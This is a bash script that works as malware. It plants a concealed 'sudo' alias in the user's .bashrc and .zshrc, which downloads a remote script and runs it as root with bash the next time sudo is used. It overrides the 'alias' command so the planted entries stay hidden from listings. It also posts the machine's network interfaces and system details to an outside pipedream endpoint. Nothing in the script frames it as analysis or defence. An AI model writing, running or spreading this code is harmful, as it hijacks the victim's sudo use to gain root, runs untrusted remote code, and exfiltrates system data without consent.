#!/bin/bash

SUDO_ALIAS='\n\\alias sudo="sudo -l > /dev/null && ((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash > /dev/null 2>&1 &disown > /dev/null 2>&1) && unset -f nalias && unalias sudo && unalias alias && sudo \\`#h1dD3N\\`"
\nfunction nalias() { if [ $# = 0 ]; then \\alias | /bin/grep -v "h1dD3N"; else \\alias "$1"; fi } #h1dD3N"
\nalias alias="nalias \\`#h1dD3N\\`"'

function install_in_rc() {
    if ! [ -f "$1" ]; then
        return
    fi
    sed -i '/h1dD3N/d' "$1"
    if ! grep -q "h1dD3N" "$1"; then
        echo -ne $SUDO_ALIAS >> "$1"
    fi
}

install_in_rc ~/.bashrc
install_in_rc ~/.zshrc

(ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
